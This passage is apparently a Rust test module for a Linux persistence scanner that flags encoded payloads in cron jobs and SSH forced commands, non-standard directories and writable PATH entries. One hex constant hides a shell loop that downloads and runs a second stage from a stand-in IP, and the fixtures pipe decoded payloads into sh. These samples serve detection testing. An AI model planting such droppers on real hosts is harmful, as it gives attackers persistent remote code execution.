    const HEX_PAYLOAD: &str = "23212f62696e2f73680a7768696c65203a3b20646f206375726c202d6673534c20687474703a2f2f3139382e35312e3130302e372f737461676532207c2073683b20736c656570203630303b20646f6e650a6578697420300a";
    /// A sha256 digest as `pip --require-hashes` writes it: 64 hex characters
    /// in a command that is doing exactly what it is supposed to.
    const SHA256: &str = "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08";
    /// The sha1 directory name in an Autodesk Wine launcher on this host —
    /// the longest hex run any real command in the measurement carried.
    const WINE: &str = "sh -c 'wine \"/home/u/.wine/drive_c/Program Files/Autodesk/webdeploy/production/2b84ec48843dc39cc73fec4274fad44f45968ec2/Autodesk Identity Manager/AdskIdentityManager.exe\" \"%u\"'";

    struct Encoded;

    impl Collector for Encoded {
        fn name(&self) -> &'static str {
            "encoded"
        }

        fn collect(&self, cx: &mut Ctx) -> Vec<Entry> {
            let jobs: Vec<(Kind, &str, &str, Vec<u8>)> = vec![
                (
                    Kind::Cron,
                    "etc/cron.d/dropper",
                    "dropper",
                    format!("echo {B64_PAYLOAD} | base64 -d | sh").into_bytes(),
                ),
                (
                    Kind::Cron,
                    "etc/cron.d/hexdropper",
                    "hexdropper",
                    format!("echo {HEX_PAYLOAD} | xxd -r -p | sh").into_bytes(),
                ),
                (
                    Kind::Cron,
                    "etc/cron.d/pip",
                    "pip",
                    format!("/usr/bin/pip install --require-hashes --hash=sha256:{SHA256} requests")
                        .into_bytes(),
                ),
                (
                    Kind::Cron,
                    "etc/cron.d/generator",
                    "generator",
                    b"/usr/lib/systemd/system-generators/systemd-hibernate-resume-generator --dry-run".to_vec(),
                ),
                (Kind::Cron, "etc/cron.d/wine", "wine", WINE.as_bytes().to_vec()),
                (
                    Kind::Cron,
                    "etc/cron.d/lvm",
                    "lvm",
                    b"/usr/bin/env LVM_SUPPRESS_LOCKING_FAILURE_MESSAGES=1 /usr/sbin/lvm vgchange -aay".to_vec(),
                ),
                (
                    Kind::Cron,
                    "etc/cron.d/mount",
                    "mount",
                    b"/usr/bin/mount /dev/disk/by-uuid/123e4567-e89b-12d3-a456-426614174000 /mnt/data".to_vec(),
                ),
                // Padding characters alone, and bytes that are not UTF-8 at
                // all: neither is a run, and neither may panic the pass.
                (Kind::Cron, "etc/cron.d/padding", "padding", b"==== ============".to_vec()),
                (Kind::Cron, "etc/cron.d/raw", "raw", vec![0xff; 200]),
                // An ordinary forced command behind a key whose fingerprint —
                // 44 base64 characters — is the entry's name, not its command.
                (
                    Kind::SshAuthorizedKey,
                    "root/.ssh/authorized_keys",
                    "SHA256:pyEwQNS9tWtxBjLUwlnHcXVELdTeMMRFDmDW6C/fqPs",
                    b"/usr/bin/rrsync -ro /srv/backup".to_vec(),
                ),
                (
                    Kind::SshAuthorizedKey,
                    "root/.ssh/authorized_keys",
                    "SHA256:hQ9tVqpJxS1ZrEoKnT3uWgYd8mLbC5fN0aXiR7vPjUw",
                    format!("sh -c 'echo {B64_PAYLOAD} | base64 -d | sh'").into_bytes(),
                ),
            ];

            jobs.into_iter()
                .map(|(kind, source, name, command)| {
                    let mut e = cx.entry(kind, source, name);
                    e.trigger = Trigger::Schedule;
                    e.principal = Some("root".to_string());
                    if kind == Kind::SshAuthorizedKey {
                        e.note("ssh_mechanism", "authorized-key");
                        e.note("options", format!("command=\"{}\"", String::from_utf8_lossy(&command)));
                    }
                    e.command = Some(command);
                    e
                })
                .collect()
        }
    }

    #[test]
    fn an_encoded_payload_is_reported_and_a_digest_is_not() {
        let dir = std::env::temp_dir().join(format!("unbidden-encoding-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(dir.join("etc/cron.d")).unwrap();
        std::fs::create_dir_all(dir.join("root/.ssh")).unwrap();
        for job in ["dropper", "hexdropper", "pip", "generator", "wine", "lvm", "mount", "padding", "raw"] {
            std::fs::write(dir.join("etc/cron.d").join(job), b"@daily root x\n").unwrap();
        }
        std::fs::write(dir.join("root/.ssh/authorized_keys"), b"ssh-ed25519 AAAA\n").unwrap();

        let root = Root::at(&dir).unwrap();
        let collectors: Vec<Box<dyn Collector>> = vec![Box::new(Encoded)];
        let mut scan = scan::run(&root, &Options { deep: false }, &collectors);
        enrich(&root, &mut scan);

        let dropper = find(&scan, "dropper");
        assert!(dropper.has_flag(Flag::EncodingAnomaly));
        assert_eq!(
            dropper.raw["encoded_run"],
            format!("base64, {} chars at offset 5", B64_PAYLOAD.len()),
            "the operator is told where to look without being handed a decode"
        );

        let hex = find(&scan, "hexdropper");
        assert!(hex.has_flag(Flag::EncodingAnomaly));
        assert_eq!(hex.raw["encoded_run"], format!("hex, {} chars at offset 5", HEX_PAYLOAD.len()));

        // Everything a working host does with long encoding-alphabet runs.
        for ordinary in ["pip", "generator", "wine", "lvm", "mount", "padding"] {
            let e = find(&scan, ordinary);
            assert!(
                !e.has_flag(Flag::EncodingAnomaly),
                "{ordinary} is an ordinary command: {}",
                String::from_utf8_lossy(e.command.as_deref().unwrap_or_default())
            );
            assert!(!e.raw.contains_key("encoded_run"));
        }
        // Raw high bytes are not an encoding's alphabet, so no run is reported;
        // that they are not text is what is flagged.
        let raw = find(&scan, "raw");
        assert!(raw.has_flag(Flag::EncodingAnomaly));
        assert!(!raw.raw.contains_key("encoded_run"));

        // The key material never reaches `command` — the fingerprint is the
        // name and the blob stays in the file — so the kind needs no
        // exemption, and the forced command is read like any other.
        let key = find(&scan, "SHA256:pyEwQNS9tWtxBjLUwlnHcXVELdTeMMRFDmDW6C/fqPs");
        assert!(!key.has_flag(Flag::EncodingAnomaly), "a key blob is not a payload in a command");
        let forced = find(&scan, "SHA256:hQ9tVqpJxS1ZrEoKnT3uWgYd8mLbC5fN0aXiR7vPjUw");
        assert!(forced.has_flag(Flag::EncodingAnomaly), "a forced command is where a key line hides one");

        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn a_run_ends_at_the_characters_that_make_a_path_or_a_uuid() {
        // Both sides of every threshold, on the bytes alone.
        let at = |s: &str| encoded_run(s.as_bytes()).map(|(o, l, a)| (o, l, a));
        assert_eq!(at(&"X".repeat(47)), None);
        assert_eq!(at(&"X".repeat(48)), Some((0, 48, "base64")));
        assert_eq!(at(&"a".repeat(159)), None, "still hex, still under the hex threshold");
        assert_eq!(at(&"a".repeat(160)), Some((0, 160, "hex")));
        // A digest is a hex run whichever case it is written in, which is the
        // whole reason the two thresholds differ.
        assert_eq!(at(&"A".repeat(64)), None, "a sha256 in capitals is still a sha256");
        assert_eq!(
            at(&format!("g{}", "a".repeat(47))),
            Some((0, 48, "base64")),
            "one character outside the hex alphabet changes which threshold applies"
        );
        // A path and a UUID are runs only if the separators are not.
        assert_eq!(at(&format!("/usr/{}/{}", "x".repeat(40), "y".repeat(40))), None);
        assert_eq!(at(&format!("{}-{}-{}", "x".repeat(40), "y".repeat(40), "z".repeat(40))), None);
        // `=` counts as padding, never as a join between two runs.
        assert_eq!(at(&format!("{}={}", "X".repeat(40), "Y".repeat(40))), None);
        assert_eq!(at(&format!("{}==", "X".repeat(46))), Some((0, 48, "base64")));
        // The longest qualifying run is the one reported.
        assert_eq!(at(&format!("{} {}", "X".repeat(50), "Y".repeat(60))), Some((51, 60, "base64")));
        assert_eq!(encoded_run(b""), None);
        assert_eq!(encoded_run(&[0xff; 300]), None);
    }

    #[test]
    fn every_directory_a_collector_walks_is_a_standard_location() {
        let dir = std::env::temp_dir().join(format!("unbidden-standard-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let root = Root::at(&dir).unwrap();
        for (kind, path) in [
            (Kind::Udev, "usr/local/lib/udev/rules.d/60-x.rules"),
            (Kind::KernelModule, "run/modprobe.d/x.conf"),
            (Kind::KernelModule, "usr/local/lib/modprobe.d/x.conf"),
            (Kind::KernelModule, "usr/local/lib/modules-load.d/x.conf"),
            (Kind::KernelModule, "lib/modules-load.d/x.conf"),
            (Kind::XdgAutostart, "etc/xdg/xdg-xubuntu/autostart/x.desktop"),
        ] {
            let mut e = Entry::new(kind, dir.join(path), "x");
            apply_location(&root, &mut e);
            assert!(!e.has_flag(Flag::NonStandardLocation), "{path}");
        }
        let mut e = Entry::new(Kind::Udev, dir.join("opt/udev/rules.d/60-x.rules"), "x");
        apply_location(&root, &mut e);
        assert!(e.has_flag(Flag::NonStandardLocation), "the check still fails closed");
        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn a_search_path_someone_untrusted_can_write_is_flagged() {
        use std::os::unix::fs::{MetadataExt, PermissionsExt};
        let dir = std::env::temp_dir().join(format!("unbidden-searchpath-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        for (d, mode) in [("ww", 0o1777), ("mine", 0o755), ("gw", 0o775), ("ok", 0o755)] {
            std::fs::create_dir_all(dir.join(d)).unwrap();
            std::fs::set_permissions(dir.join(d), std::fs::Permissions::from_mode(mode)).unwrap();
        }
        let meta = std::fs::metadata(dir.join("mine")).unwrap();
        let (uid, gid) = (meta.uid(), meta.gid());
        let root = Root::at(&dir).unwrap();
        let carrier = |owner: u32| {
            let mut e = Entry::new(Kind::ShellProfile, dir.join("etc/profile"), "profile");
            e.note("env.PATH", "/usr/bin:/ww:/mine:$HOME/bin:.::/nonexistent:/gw");
            e.owner_uid = owner;
            writable_search_path(&root, &mut e);
            e
        };

        // Declared in a root-owned file: the scanning user's own directories
        // are not trusted either.
        let e = carrier(0);
        assert!(e.has_flag(Flag::WritableSearchPath));
        let mut want = vec!["/ww (world-writable)".to_string(), format!("/mine (owned by uid {uid})")];
        want.push(". (relative: the current directory)".into());
        want.push("an empty entry (relative: the current directory)".into());
        if gid != 0 {
            want.push(format!("/gw (writable by group {gid})"));
        }
        assert_eq!(e.raw["writable_search_path"], want.join("; "));

        // Declared in a file the directory's owner already controls.
        let e = carrier(uid);
        assert!(!e.raw["writable_search_path"].contains("/mine"), "{}", e.raw["writable_search_path"]);

        let mut lib = Entry::new(Kind::LibraryDir, dir.join("etc/ld.so.conf.d/x.conf"), "/ok");
        lib.owner_uid = uid;
        writable_search_path(&root, &mut lib);
        assert!(!lib.has_flag(Flag::WritableSearchPath), "owned by the file's owner, mode 755");
        let mut lib = Entry::new(Kind::LibraryDir, dir.join("etc/ld.so.conf.d/x.conf"), "/ww");
        writable_search_path(&root, &mut lib);
        assert!(lib.has_flag(Flag::WritableSearchPath));

        let mut quiet = Entry::new(Kind::ShellProfile, dir.join("etc/environment"), "environment");
        quiet.note("env.PATH", "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin");
        writable_search_path(&root, &mut quiet);
        assert!(quiet.flags.is_empty());
        // Debian's /etc/init.d/ssh: the colons inside ${...} are the
        // expansion's, not separators.
        let mut quiet = Entry::new(Kind::SysvInit, dir.join("etc/init.d/ssh"), "ssh");
        quiet.note("env.PATH", "${PATH:+$PATH:}/usr/sbin:/sbin");
        writable_search_path(&root, &mut quiet);
        assert!(quiet.flags.is_empty());
        std::fs::remove_dir_all(&dir).unwrap();
    }
}
